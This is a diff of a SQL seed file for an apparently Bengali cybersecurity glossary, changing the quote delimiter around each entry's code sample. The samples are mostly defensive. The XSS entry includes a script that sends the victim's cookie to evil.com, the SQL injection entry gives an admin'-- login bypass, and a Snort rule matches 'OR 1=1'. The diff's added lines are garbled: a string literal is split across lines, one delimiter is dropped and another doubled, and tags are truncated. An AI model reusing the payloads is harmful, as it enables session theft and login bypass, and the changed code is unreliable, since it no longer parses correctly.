@@ -65,7 +65,7 @@ VALUES
  'Authentication হলো এমন একটি প্রক্রিয়া যেখানে সিস্টেম নিশ্চিত করে যে ব্যবহারকারী সত্যিই সে-ই যে সে দাবি করছে। তিন ধরন: কিছু জানা (পাসওয়ার্ড), কিছু থাকা (OTP), বা কিছু হওয়া (বায়োমেট্রিক)।',
  'ব্যাংকিং অ্যাপে লগইন, OTP যাচাই, বায়োমেট্রিক স্ক্যান।',
  'Gmail-এ লগইন করতে সঠিক ইমেইল + পাসওয়ার্ড দিতে হয় — এটাই Authentication।',
- $code$// JWT Authentication (Node.js)
+ $CSDICT$// JWT Authentication (Node.js)
 const jwt = require('jsonwebtoken');
 
 const token = jwt.sign(
@@ -78,7 +78,7 @@ jwt.verify(token, process.env.JWT_SECRET, (err, decoded) => {
   if (err) return res.status(401).json({ error: 'Invalid token' });
   req.user = decoded;
   next();
-});$code$,
+});$CSDICT$,
  ARRAY['identity','login','JWT','OAuth','session'],
  'high','Identity',
  'https://images.unsplash.com/photo-1614064641938-3bbee52942c7?w=600&q=80'),
@@ -88,7 +88,7 @@ jwt.verify(token, process.env.JWT_SECRET, (err, decoded) => {
  'Authorization হলো Authentication-এর পরের ধাপ — কোন ব্যবহারকারী কোন রিসোর্সে অ্যাক্সেস পাবে তা নির্ধারণ। RBAC, ABAC ও DAC তিনটি প্রধান মডেল।',
  'Admin সব ডেটা দেখতে পারে, regular user শুধু নিজের ডেটা দেখতে পারে।',
  'হাসপাতাল সিস্টেমে ডাক্তার রোগীর রেকর্ড দেখতে পারেন, রিসেপশনিস্ট পারেন না।',
- $code$// RBAC Authorization (Node.js)
+ $CSDICT$// RBAC Authorization (Node.js)
 const checkRole = (required) => (req, res, next) => {
   const hierarchy = { admin: 3, doctor: 2, patient: 1 };
   if (hierarchy[req.user.role] >= hierarchy[required])
@@ -96,7 +96,7 @@ const checkRole = (required) => (req, res, next) => {
   res.status(403).json({ error: 'Access Denied' });
 };
 
-app.get('/admin', authenticate, checkRole('admin'), handler);$code$,
+app.get('/admin', authenticate, checkRole('admin'), handler);$CSDICT$,
  ARRAY['RBAC','access-control','permissions','ACL'],
  'high','Access Control',
  'https://images.unsplash.com/photo-1555949963-aa79dcee981c?w=600&q=80'),
@@ -106,7 +106,7 @@ app.get('/admin', authenticate, checkRole('admin'), handler);$code$,
  'ARP Spoofing হলো এমন আক্রমণ যেখানে attacker ভুয়া ARP বার্তা পাঠিয়ে নেটওয়ার্কে নিজেকে অন্য কারো হিসেবে দেখায়, ফলে সব ট্র্যাফিক তার মধ্য দিয়ে যায়।',
  'Man-in-the-Middle আক্রমণ, নেটওয়ার্ক ট্র্যাফিক intercept।',
  'কফিশপের WiFi-তে attacker নিজেকে রাউটার হিসেবে দেখিয়ে সবার ট্র্যাফিক পড়ছে।',
- $code$# ARP Spoofing সনাক্তকরণ (Python)
+ $CSDICT$# ARP Spoofing সনাক্তকরণ (Python)
 from scapy.all import ARP, sniff
 
 def detect(pkt):
@@ -115,7 +115,7 @@ def detect(pkt):
         if real and real != pkt[ARP].hwsrc:
             print(f"⚠️ Spoofing! IP:{pkt[ARP].psrc}")
 
-sniff(filter="arp", prn=detect, store=0)$code$,
+sniff(filter="arp", prn=detect, store=0)$CSDICT$,
  ARRAY['network','MITM','spoofing','LAN'],
  'critical','Network Attack',
  'https://images.unsplash.com/photo-1558494949-ef010cbdcc31?w=600&q=80'),
@@ -125,19 +125,20 @@ sniff(filter="arp", prn=detect, store=0)$code$,
  'Botnet হলো malware-সংক্রমিত কম্পিউটারের নেটওয়ার্ক যা C&C (Command & Control) সার্ভার দ্বারা নিয়ন্ত্রিত।',
  'DDoS আক্রমণ, স্প্যাম ইমেইল, ক্রিপ্টোমাইনিং।',
  'Mirai Botnet ২০১৬ সালে ৬০০,০০০ IoT ডিভাইস দিয়ে মেজর সাইট ডাউন করে।',
- $code$# C2 Connection সনাক্তকরণ (Python)
+ $CSDICT$# C2 Connection সনাক্তকরণ (Python)
 import subprocess
 
 def check_c2():
     result = subprocess.run(['netstat','-an'],
                           capture_output=True, text=True)
     c2_ports = [6667, 1337, 31337, 4444]
-    for line in result.stdout.split('\n'):
+    for line in result.stdout.split('
+'):
         for port in c2_ports:
             if f':{port}' in line and 'ESTABLISHED' in line:
                 print(f"🚨 Suspicious C2: {line.strip()}")
 
-check_c2()$code$,
+check_c2()$CSDICT$,
  ARRAY['malware','DDoS','C2','zombie','IoT'],
  'critical','Malware',
  'https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?w=600&q=80'),
@@ -147,7 +148,7 @@ check_c2()$code$,
  'Brute Force Attack হলো সব সম্ভাব্য পাসওয়ার্ড ক্রমানুসারে চেষ্টা করে সঠিকটি খুঁজে বের করার পদ্ধতি।',
  'দুর্বল পাসওয়ার্ড crack, PIN অনুমান, hash cracking।',
  'admin/admin, admin/password — বারবার লগইন চেষ্টা।',
- $code$// Rate Limiting (Express.js)
+ $CSDICT$// Rate Limiting (Express.js)
 const rateLimit = require('express-rate-limit');
 
 const limiter = rateLimit({
@@ -156,7 +157,7 @@ const limiter = rateLimit({
   message: { error: 'Too many attempts. Retry in 15 min.' }
 });
 
-app.post('/login', limiter, loginHandler);$code$,
+app.post('/login', limiter, loginHandler);$CSDICT$,
  ARRAY['password','attack','rate-limiting','lockout'],
  'high','Attack Vector',
  'https://images.unsplash.com/photo-1563986768609-322da13575f3?w=600&q=80'),
@@ -166,7 +167,7 @@ app.post('/login', limiter, loginHandler);$code$,
  'Cryptography হলো তথ্যকে এমনভাবে রূপান্তর করার বিজ্ঞান যাতে শুধু অনুমোদিত পক্ষ পড়তে পারে। Symmetric (AES) ও Asymmetric (RSA) দুই ধরন।',
  'HTTPS, WhatsApp E2E encryption, ব্যাংক ট্র্যানজ্যাকশন।',
  'WhatsApp মেসেজ end-to-end encrypted — Meta-ও পড়তে পারে না।',
- $code$// AES-256-GCM Encryption (Node.js)
+ $CSDICT$// AES-256-GCM Encryption (Node.js)
 const crypto = require('crypto');
 const KEY = crypto.randomBytes(32);
 
@@ -176,9 +177,9 @@ function encrypt(text) {
   const enc = c.update(text,'utf8','hex') + c.final('hex');
   return { enc, iv: iv.toString('hex'), tag: c.getAuthTag().toString('hex') };
 }
-console.log(encrypt("গোপন বার্তা"));$code$,
- ARRAY['AES','RSA','TLS','PKI','E2$code$],
- $code$medium','Cryptography',
+console.log(encrypt("গোপন বার্তা"));$CSDICT$,
+ ARRAY['AES','RSA','TLS','PKI','E2E'],
+ 'medium','Cryptography',
  'https://images.unsplash.com/photo-1614064641938-3bbee52942c7?w=600&q=80'),
 
 ('C','Cross-Site Scripting (XSS)','ওয়েবসাইটে ক্ষতিকর স্ক্রিপ্ট ইনজেকশন',
@@ -186,7 +187,7 @@ console.log(encrypt("গোপন বার্তা"));$code$,
  'XSS হলো OWASP Top 10-এর অন্যতম — attacker ওয়েবসাইটে malicious JavaScript inject করে যা অন্য ব্যবহারকারীর ব্রাউজারে execute হয়।',
  'Session cookie চুরি, keylogging, redirect।',
  'কমেন্ট বক্সে <script>document.location=''evil.com?c=''+document.cookie</script>',
- $code$// XSS Prevention
+ $CSDICT$// XSS Prevention
 
 // ❌ Vulnerable
 element.innerHTML = userInput;
@@ -200,7 +201,7 @@ element.innerHTML = DOMPurify.sanitize(userInput);
 
 // ✅ CSP Header
 res.setHeader('Content-Security-Policy',
-  "default-src 'self'; script-src 'self'");$code$,
+  "default-src 'self'; script-src 'self'");,
  ARRAY['web','injection','OWASP','DOM','CSP'],
  'critical','Web Security',
  'https://images.unsplash.com/photo-1555949963-aa79dcee981c?w=600&q=80'),
@@ -210,7 +211,7 @@ res.setHeader('Content-Security-Policy',
  'CSRF হলো এমন আক্রমণ যেখানে authenticated ব্যবহারকারীকে তার অজান্তে unwanted HTTP request করানো হয়।',
  'Bank transfer, পাসওয়ার্ড পরিবর্তন, account মুছে ফেলা।',
  'Bank-এ logged-in থাকলে ক্ষতিকর লিঙ্কে ক্লিক করলে টাকা চলে যায়।',
- $code$// CSRF Token (Express)
+ $CSDICT$// CSRF Token (Express)
 const csrf = require('csurf');
 const csrfProtection = csrf({ cookie: { sameSite: 'strict' } });
 
@@ -222,7 +223,7 @@ app.post('/form', csrfProtection, handler);
 // Cookie
 res.cookie('session', token, {
   sameSite: 'strict', httpOnly: true, secure: true
-});$code$,
+});$CSDICT$,
  ARRAY['web','OWASP','token','cookies','SameSite'],
  'high','Web Security',
  'https://images.unsplash.com/photo-1563986768609-322da13575f3?w=600&q=80'),
@@ -232,7 +233,7 @@ res.cookie('session', token, {
  'DDoS (Distributed Denial of Service) হলো হাজার সিস্টেম থেকে একসাথে request পাঠিয়ে সার্ভারকে overwhelm করা। Volumetric, Protocol ও Application layer — তিন ধরন।',
  'প্রতিযোগী সাইট ডাউন করা, extortion, hacktivism।',
  'GitHub ২০২০ সালে ২.৫ Tbps DDoS সামলেছিল।',
- $code$# Nginx Rate Limiting
+ $CSDICT$# Nginx Rate Limiting
 # /etc/nginx/nginx.conf
 
 http {
@@ -245,17 +246,17 @@ http {
     client_body_timeout 10s;
   }
 }
-# Production: Cloudflare / AWS Shield ব্যবহার করুন$code$,
+# Production: Cloudflare / AWS Shield ব্যবহার করুন$CSDICT$,
  ARRAY['network','availability','botnet','Cloudflare','CDN'],
  'critical','Network Attack',
  'https://images.unsplash.com/photo-1558494949-ef010cbdcc31?w=600&q=80'),
 
-('$code$,$code$Encryption','তথ্য সুরক্ষিত রূপান্তর',
+('','Encryption','তথ্য সুরক্ষিত রূপান্তর',
  '📦 চিঠি বিশেষ বাক্সে তালা দিয়ে পাঠানো — শুধু চাবিওয়ালা খুলতে পারবে।',
  'Encryption হলো plaintext ডেটাকে cipher algorithm দিয়ে ciphertext-এ রূপান্তর করা। Symmetric-এ একই key, Asymmetric-এ public/private key pair।',
  'HTTPS, database encryption, file encryption, PGP email।',
  'WhatsApp মেসেজ Signal Protocol দিয়ে end-to-end encrypt।',
- $code$# Python Fernet Encryption
+ $CSDICT$# Python Fernet Encryption
 from cryptography.fernet import Fernet
 
 key = Fernet.generate_key()
@@ -265,8 +266,8 @@ token = f.encrypt(b"sensitive data")
 print("Encrypted:", token)
 
 original = f.decrypt(token)
-print("Decrypted:", original.decode())$code$,
- ARRAY['AES','RSA','TLS','E2$code$,$code$data-protection'],
+print("Decrypted:", original.decode())$CSDICT$,
+ ARRAY['AES','RSA','TLS','E2','data-protection'],
  'medium','Cryptography',
  'https://images.unsplash.com/photo-1614064641938-3bbee52942c7?w=600&q=80'),
 
@@ -275,7 +276,7 @@ print("Decrypted:", original.decode())$code$,
  'Firewall হলো predefined rules অনুযায়ী incoming/outgoing ট্র্যাফিক নিয়ন্ত্রণকারী সিস্টেম। Packet Filter, Stateful, WAF — তিন ধরন।',
  'Unauthorized access ব্লক, port scanning প্রতিরোধ।',
  'কর্পোরেট ফায়ারওয়াল সোশ্যাল মিডিয়া ব্লক রেখেছে।',
- $code$# iptables Firewall Rules
+ $CSDICT$# iptables Firewall Rules
 
 iptables -P INPUT DROP
 iptables -P FORWARD DROP
@@ -284,7 +285,7 @@ iptables -P OUTPUT ACCEPT
 iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
 iptables -A INPUT -i lo -j ACCEPT
 iptables -A INPUT -p tcp -m multiport --dports 80,443 -j ACCEPT
-iptables -A INPUT -p tcp --dport 22 -s 203.0.113.0/24 -j ACCEPT$code$,
+iptables -A INPUT -p tcp --dport 22 -s 203.0.113.0/24 -j ACCEPT$CSDICT$,
  ARRAY['network','iptables','WAF','packet-filter'],
  'low','Defense',
  'https://images.unsplash.com/photo-1558494949-ef010cbdcc31?w=600&q=80'),
@@ -294,7 +295,7 @@ iptables -A INPUT -p tcp --dport 22 -s 203.0.113.0/24 -j ACCEPT$code$,
  'Hashing হলো একমুখী ক্রিপ্টোগ্রাফিক ফাংশন যা যেকোনো ইনপুটকে নির্দিষ্ট দৈর্ঘ্যের hash-এ রূপান্তর করে। SHA-256, bcrypt, Argon2 জনপ্রিয়।',
  'পাসওয়ার্ড স্টোরেজ, ফাইল integrity যাচাই, digital signature।',
  'ডেটাবেসে পাসওয়ার্ড কখনো plaintext রাখা হয় না — bcrypt hash হিসেবে।',
- $code$// bcrypt (Node.js)
+ $CSDICT$// bcrypt (Node.js)
 const bcrypt = require('bcrypt');
 
 async function hashPassword(plain) {
@@ -307,7 +308,7 @@ async function verify(plain, hash) {
 
 // SHA-256 (Python)
 import hashlib
-print(hashlib.sha256(b"data").hexdigest())$code$,
+print(hashlib.sha256(b"data").hexdigest())$CSDICT$,
  ARRAY['SHA-256','bcrypt','Argon2','integrity','password'],
  'low','Cryptography',
  'https://images.unsplash.com/photo-1614064641938-3bbee52942c7?w=600&q=80'),
@@ -317,7 +318,7 @@ print(hashlib.sha256(b"data").hexdigest())$code$,
  'IDS (Intrusion Detection System) সন্দেহজনক কার্যকলাপ সনাক্ত করে alert পাঠায়। IPS (Intrusion Prevention System) সক্রিয়ভাবে ব্লকও করে।',
  'Zero-day সনাক্ত, insider threat মনিটর, compliance logging।',
  'Snort IDS রাত ৩টায় port scan সনাক্ত করে admin-কে email পাঠালো।',
- $code$# Snort IDS Rule
+ $CSDICT$# Snort IDS Rule
 # /etc/snort/rules/local.rules
 
 alert tcp any any -> $HOME_NET any (
@@ -333,7 +334,7 @@ alert http any any -> $HTTP_SERVERS any (
   content:"OR 1=1";
   http_uri;
   sid:1000002;
-)$code$,
+)$CSDICT$,
  ARRAY['monitoring','SIEM','Snort','Suricata','anomaly'],
  'medium','Defense',
  'https://images.unsplash.com/photo-1563986768609-322da13575f3?w=600&q=80'),
@@ -343,7 +344,7 @@ alert http any any -> $HTTP_SERVERS any (
  'Malware (Malicious Software) হলো ক্ষতির জন্য তৈরি সফটওয়্যার। Virus, Worm, Trojan, Ransomware, Spyware, Adware, Rootkit — বিভিন্ন ধরন।',
  'ডেটা চুরি, সিস্টেম ধ্বংস, cryptomining।',
  'WannaCry ২০১৭ সালে ১৫০ দেশের লক্ষ কম্পিউটার encrypt করে।',
- $code$# Static Malware Analysis
+ $CSDICT$# Static Malware Analysis
 import hashlib, re
 
 def analyze(path):
@@ -358,7 +359,7 @@ def analyze(path):
         if p.lower() in text.lower():
             print(f"⚠️ Found: {p}")
 
-analyze('suspicious.exe')$code$,
+analyze('suspicious.exe')$CSDICT$,
  ARRAY['virus','ransomware','trojan','spyware','rootkit'],
  'critical','Malware',
  'https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?w=600&q=80'),
@@ -368,7 +369,7 @@ analyze('suspicious.exe')$code$,
  'MITM আক্রমণে attacker দুটি পক্ষের যোগাযোগে গোপনে প্রবেশ করে ডেটা পড়ে বা পরিবর্তন করে।',
  'Public WiFi-তে credential চুরি, session hijacking।',
  'কফিশপে ফ্রি WiFi-তে ব্যাংকিং তথ্য intercept হচ্ছে।',
- $code$// MITM Prevention
+ $CSDICT$// MITM Prevention
 
 // 1. Always verify SSL
 const https = require('https');
@@ -383,7 +384,7 @@ app.use((req, res, next) => {
 });
 
 // 3. Force HTTPS
-if (!req.secure) res.redirect(301, 'https://' + req.headers.host + req.url);$code$,
+if (!req.secure) res.redirect(301, 'https://' + req.headers.host + req.url);$CSDICT$,
  ARRAY['network','SSL','HSTS','certificate','WiFi'],
  'critical','Network Attack',
  'https://images.unsplash.com/photo-1558494949-ef010cbdcc31?w=600&q=80'),
@@ -393,7 +394,7 @@ if (!req.secure) res.redirect(301, 'https://' + req.headers.host + req.url);$cod
  'Network Scanning হলো নেটওয়ার্কে active hosts, open ports ও services সনাক্ত করার প্রক্রিয়া। Penetration testing-এর প্রথম ধাপ।',
  'Vulnerability assessment, asset inventory।',
  'Nmap দিয়ে নেটওয়ার্কে কোন port খোলা আছে দেখা।',
- $code$# Nmap Network Scanning
+ $CSDICT$# Nmap Network Scanning
 
 # Service & Version detection
 nmap -sV -sC 192.168.1.0/24
@@ -409,7 +410,7 @@ import socket
 def scan(host, ports):
     return [p for p in ports
             if not socket.socket().connect_ex((host,p))]
-print(scan('192.168.1.1', range(1,1025)))$code$,
+print(scan('192.168.1.1', range(1,1025)))$CSDICT$,
  ARRAY['Nmap','recon','port-scan','OSINT','pentest'],
  'medium','Reconnaissance',
  'https://images.unsplash.com/photo-1558494949-ef010cbdcc31?w=600&q=80'),
@@ -419,7 +420,7 @@ print(scan('192.168.1.1', range(1,1025)))$code$,
  'OWASP Top 10 হলো সবচেয়ে গুরুতর ওয়েব অ্যাপ্লিকেশন নিরাপত্তা ঝুঁকির তালিকা, প্রতি ৩-৪ বছরে আপডেট হয়।',
  'Secure development checklist, security audit baseline।',
  'OWASP 2021: A01-Broken Access Control, A02-Cryptographic Failures, A03-Injection।',
- $code$// OWASP Top 10 (2021)
+ $CSDICT$// OWASP Top 10 (2021)
 const owasp = [
   { rank:"A01", name:"Broken Access Control",    fix:"RBAC, least privilege" },
   { rank:"A02", name:"Cryptographic Failures",   fix:"TLS 1.3, AES-256" },
@@ -431,7 +432,7 @@ const owasp = [
   { rank:"A08", name:"Integrity Failures",       fix:"Code signing, SAST" },
   { rank:"A09", name:"Logging Failures",         fix:"SIEM, audit logs" },
   { rank:"A10", name:"SSRF",                     fix:"Allowlist, firewall" },
-];$code$,
+];$CSDICT$,
  ARRAY['web','standards','checklist','SAST','compliance'],
  'high','Web Security',
  'https://images.unsplash.com/photo-1555949963-aa79dcee981c?w=600&q=80'),
@@ -441,7 +442,7 @@ const owasp = [
  'Phishing হলো বৈধ সংস্থার ছদ্মবেশে sensitive তথ্য দিতে প্রতারণা। Spear Phishing, Whaling, Vishing variant।',
  'Login credentials চুরি, credit card তথ্য, malware।',
  '''Your bank account will be closed'' ইমেইলের লিঙ্ক fake সাইটে নিয়ে যায়।',
- $code$// Phishing Domain Check
+ $CSDICT$// Phishing Domain Check
 const dns = require('dns').promises;
 
 async function checkDomain(domain) {
@@ -454,7 +455,7 @@ async function checkDomain(domain) {
   result.fake = fakes.some(f => domain.includes(f));
   return result;
 }
-checkDomain('paypa1.com').then(console.log);$code$,
+checkDomain('paypa1.com').then(console.log);$CSDICT$,
  ARRAY['social-engineering','email','spear-phishing','vishing'],
  'critical','Social Engineering',
  'https://images.unsplash.com/photo-1563986768609-322da13575f3?w=600&q=80'),
@@ -464,7 +465,7 @@ checkDomain('paypa1.com').then(console.log);$code$,
  'Ransomware হলো malware যা ভিকটিমের ফাইল encrypt করে Bitcoin মুক্তিপণ দাবি করে। RaaS (Ransomware-as-a-Service) এখন সহজলভ্য।',
  'হাসপাতাল, স্কুল, সরকারি সংস্থা — বড় প্রতিষ্ঠান টার্গেট।',
  'Colonial Pipeline ২০২১ সালে $4.4M Bitcoin মুক্তিপণ দিতে বাধ্য।',
- $code$# 3-2-1 Backup Strategy
+ $CSDICT$# 3-2-1 Backup Strategy
 import os, shutil, datetime, hashlib
 
 def backup(src, dst):
@@ -481,7 +482,7 @@ def backup(src, dst):
     print(f"✅ {len(manifest)} files backed up")
 
 # 3 copies, 2 media types, 1 offsite
-backup('/data','/backup/local')$code$,
+backup('/data','/backup/local')$CSDICT$,
  ARRAY['malware','encryption','bitcoin','backup','RaaS'],
  'critical','Malware',
  'https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?w=600&q=80'),
@@ -490,8 +491,8 @@ backup('/data','/backup/local')$code$,
  '📋 ফর্মে নাম লেখার জায়গায় কমান্ড লিখলে পুরো ডেটাবেস ফাঁকি।',
  'SQL Injection হলো OWASP #3 — input ফিল্ডে malicious SQL inject করে unauthorized ডেটাবেস অ্যাক্সেস।',
  'Login bypass, সব ডেটা dump, admin access।',
- $code$Username: admin'-- দিলে পাসওয়ার্ড ছাড়াই লগইন।$code$,
- $code$// SQL Injection Prevention
+ $CSDICT$Username: admin'-- দিলে পাসওয়ার্ড ছাড়াই লগইন।$CSDICT$,
+ $CSDICT$// SQL Injection Prevention
 
 // ❌ Vulnerable
 const q = `SELECT * FROM users WHERE name='${input}'`;
@@ -505,7 +506,7 @@ const [rows] = await db.execute(
 // ✅ ORM (Prisma)
 const user = await prisma.user.findFirst({
   where: { username, password: hashedPwd }
-});$code$,
+});$CSDICT$,
  ARRAY['database','injection','OWASP','MySQL','PostgreSQL'],
  'critical','Web Security',
  'https://images.unsplash.com/photo-1555949963-aa79dcee981c?w=600&q=80'),
@@ -515,7 +516,7 @@ const user = await prisma.user.findFirst({
  'Social Engineering হলো মানুষের মনোবিজ্ঞান exploit করে তাদের confidential তথ্য দিতে বা নিরাপত্তা ভাঙতে manipulate করা।',
  'IT সাপোর্টে ফোন করে পাসওয়ার্ড রিসেট, boss সেজে fund transfer।',
  'Kevin Mitnick — বিশ্বের বিখ্যাত হ্যাকার, বেশিরভাগ hack ছিল social engineering।',
- $code$// SE Red Flags Detection
+ $CSDICT$// SE Red Flags Detection
 const flags = {
   urgency:   "এখনই করতে হবে!",
   authority: "আমি CEO বলছি",
@@ -532,7 +533,7 @@ function detectSE(msg) {
       ? "🚨 Verify through official channel!"
       : "ℹ️ Proceed with caution"
   };
-}$code$,
+}$CSDICT$,
  ARRAY['human-factor','pretexting','vishing','baiting'],
  'high','Social Engineering',
  'https://images.unsplash.com/photo-1563986768609-322da13575f3?w=600&q=80'),
@@ -542,7 +543,7 @@ function detectSE(msg) {
  '2FA (MFA) হলো দুটি আলাদা factor দিয়ে পরিচয় যাচাই: কিছু জানা (পাসওয়ার্ড) + কিছু থাকা (OTP/hardware key) বা কিছু হওয়া (biometric)।',
  'Gmail, Facebook, bank — গুরুত্বপূর্ণ সব অ্যাকাউন্টে অবশ্যই।',
  'পাসওয়ার্ড দেওয়ার পরেও Authenticator app-এর OTP লাগে।',
- $code$// TOTP 2FA (Node.js + speakeasy)
+ $CSDICT$// TOTP 2FA (Node.js + speakeasy)
 const speakeasy = require('speakeasy');
 const QRCode = require('qrcode');
 
@@ -558,7 +559,7 @@ async function setup2FA(userId, email) {
 
 function verify(secret, token) {
   return speakeasy.totp.verify({ secret, encoding:'base32', token, window:2 });
-}$code$,
+}$CSDICT$,
  ARRAY['MFA','TOTP','OTP','authenticator','hardware-key'],
  'low','Defense',
  'https://images.unsplash.com/photo-1614064641938-3bbee52942c7?w=600&q=80'),
@@ -568,7 +569,7 @@ function verify(secret, token) {
  'VPN একটি এনক্রিপ্টেড টানেল তৈরি করে ট্র্যাফিককে দূরবর্তী সার্ভারের মাধ্যমে route করে — IP লুকায়, ডেটা এনক্রিপ্ট করে।',
  'Public WiFi নিরাপত্তা, geo-block bypass, remote work।',
  'WireGuard VPN দিয়ে বাড়ি থেকে অফিস নেটওয়ার্কে secure access।',
- $code$# WireGuard VPN Setup
+ $CSDICT$# WireGuard VPN Setup
 
 # Keys generate করুন
 wg genkey | tee server.key | wg pubkey > server.pub
@@ -585,7 +586,7 @@ PublicKey = <client_public_key>
 AllowedIPs = 10.0.0.2/32
 
 wg-quick up wg0
-systemctl enable wg-quick@wg0$code$,
+systemctl enable wg-quick@wg0$CSDICT$,
  ARRAY['privacy','tunnel','OpenVPN','WireGuard','remote'],
  'low','Defense',
  'https://images.unsplash.com/photo-1558494949-ef010cbdcc31?w=600&q=80'),
@@ -595,7 +596,7 @@ systemctl enable wg-quick@wg0$code$,
  'Zero-Day হলো এমন vulnerability যা vendor জানে না বা patch বের করেনি। Nation-state actors ও APT গ্রুপ এগুলো exploit করে।',
  'Nation-state hacking, APT attacks, Stuxnet-এর মতো cyberweapon।',
  'Stuxnet ৪টি zero-day ব্যবহার করে ইরানের nuclear centrifuge ধ্বংস করেছিল।',
- $code$// Zero-Day Defense: Zero Trust
+ $CSDICT$$CSDICT$// Zero-Day Defense: Zero Trust
 
 const zeroTrust = {
   // Never Trust, Always Verify
@@ -612,8 +613,8 @@ const zeroTrust = {
   feeds: ['NVD', 'MITRE ATT&CK', 'CVE Database']
 };
 
-// Virtual Patching (WAF) while vendor patches$code$,
- ARRAY['CV$code$,$code$exploit','APT','zero-trust','patch'],
+// Virtual Patching (WAF) while vendor patches$CSDICT$,
+ ARRAY['CV','exploit','APT','zero-trust','patch'],
  'critical','Vulnerability',
  'https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?w=600&q=80')
 
